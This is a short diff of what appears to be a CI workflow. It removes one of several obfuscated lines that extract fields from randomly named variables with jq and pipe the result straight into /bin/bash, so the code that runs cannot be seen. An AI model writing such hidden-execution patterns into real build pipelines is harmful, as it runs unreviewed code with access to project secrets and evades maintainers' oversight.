@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$zp41905" | jq -r .gy2 | /bin/bash
           printf '%s' "$rmvrw075" | jq -r .ue2 | /bin/bash
           echo $fnyy2 | jq -r .e8849 | /bin/bash
-          echo $tutbu18 | jq -r .cq1435 | /bin/bash
           echo $a3676 | jq -r .ugs40 | /bin/bash
           echo $wx3 | jq -r .biy7162 | /bin/bash
           printf '%s' "$gpykn6" | jq -r .jtta21 | /bin/bash
